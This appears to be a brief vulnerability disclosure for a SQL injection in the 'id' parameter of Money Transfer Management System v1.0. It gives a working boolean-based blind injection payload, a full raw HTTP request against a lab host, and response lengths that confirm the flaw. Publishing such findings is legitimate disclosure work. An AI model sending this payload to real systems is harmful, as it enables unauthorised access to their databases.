# Money Transfer Management System v1.0 by oretnom23 has SQL injection

**Author：** k0xx

vendors: https://www.sourcecodester.com/php/15015/money-transfer-management-system-send-money-businesses-php-free-source-code.html

Vulnerability File: /mtms/admin/?page=transaction/send&id=

Vulnerability location: /mtms/admin/?page=transaction/send&id=, id

[+] Payload: /mtms/admin/?page=transaction/send&id=1%27%20and%20length(database())%20=7%20--+ // Leak place ---> id

Current database name: mtms_db,length is 7

```sql
GET /mtms/admin/?page=transaction/send&id=1%27%20and%20length(database())%20=7%20--+ HTTP/1.1
Host: 192.168.1.19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bnvs2lhahed1884v0nf12nt52s
Connection: close
// Leak place ---> id
```

When length (database ()) = 7, Content-Length: 33302
![image](https://user-images.githubusercontent.com/54017627/164714728-5381af3d-25e4-4521-8afd-b47085d8100a.png)


When length (database ()) = 8, Content-Length: 33339
![image](https://user-images.githubusercontent.com/54017627/164715254-7bf56ab7-e226-4160-b17b-edb10e77bf5b.png)

